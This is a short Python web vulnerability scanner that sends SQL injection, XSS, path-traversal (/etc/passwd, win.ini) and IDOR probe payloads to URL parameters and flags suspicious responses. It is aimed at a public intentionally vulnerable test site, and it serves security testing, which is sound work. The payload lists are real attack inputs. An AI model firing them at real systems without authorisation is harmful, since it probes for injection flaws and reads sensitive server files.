
"""
Web Vulnerability Scanner
Author: Hariharan
"""

import requests

DEFAULT_SQLI = ["' OR 1=1 --", "\" OR \"1\"=\"1", "admin' --"]
DEFAULT_XSS = ["<script>alert(1)</script>", "\" onmouseover=alert(1)", "<img src=x onerror=alert(1)>"]
DEFAULT_LFI = ["../../../../etc/passwd", "../windows/win.ini", "../../boot.ini"]
DEFAULT_IDOR = ["1", "2", "3", "100", "999"]

def sqli_scan(url, param, payloads=DEFAULT_SQLI):
    print("[*] SQLi scan")
    for payload in payloads:
        try:
            r = requests.get(url, params={param: payload}, timeout=5)
            if "syntax error" in r.text.lower() or "mysql" in r.text.lower():
                print(f"[+] SQLi detected with payload: {payload}")
        except Exception as e:
            print(f"Error: {e}")

def xss_scan(url, param, payloads=DEFAULT_XSS):
    print("[*] XSS scan")
    for payload in payloads:
        try:
            r = requests.get(url, params={param: payload}, timeout=5)
            if payload in r.text:
                print(f"[+] XSS detected with payload: {payload}")
        except Exception as e:
            print(f"Error: {e}")

def lfi_scan(url, param, payloads=DEFAULT_LFI):
    print("[*] LFI scan")
    for payload in payloads:
        try:
            r = requests.get(url, params={param: payload}, timeout=5)
            if "root:x" in r.text or "etc/passwd" in r.text:
                print(f"[+] LFI detected with payload: {payload}")
        except Exception as e:
            print(f"Error: {e}")

def idor_scan(url, param, values=DEFAULT_IDOR):
    print("[*] IDOR scan")
    for val in values:
        try:
            r = requests.get(url, params={param: val}, timeout=5)
            if r.status_code == 200 and "unauthorized" not in r.text.lower():
                print(f"[+] IDOR possible with value: {val}")
        except Exception as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    target_url = "http://testphp.vulnweb.com/login.php"
    sqli_scan(target_url, "username")
    xss_scan(target_url, "search")
    lfi_scan(target_url, "file")
    idor_scan("http://testphp.vulnweb.com/profile.php", "id")
